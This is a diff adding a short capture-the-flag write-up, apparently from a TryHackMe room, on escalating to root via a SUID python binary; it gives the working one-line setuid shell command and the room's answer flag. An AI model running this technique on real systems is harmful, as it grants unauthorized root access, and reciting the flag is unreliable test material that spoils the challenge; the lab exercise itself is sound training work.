@@ -1,0 +1,16 @@
+
+Now that we have a shell, let's escalate our privileges to root.
+
+
+1. Search for files with SUID permission, which file is weird?
+
+----> /usr/bin/python
+
+2. Find a form to escalate your privileges.
+
+----> /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+3. root.txt
+
+---> THM{pr1v1l3g3_3sc4l4t10n}
+
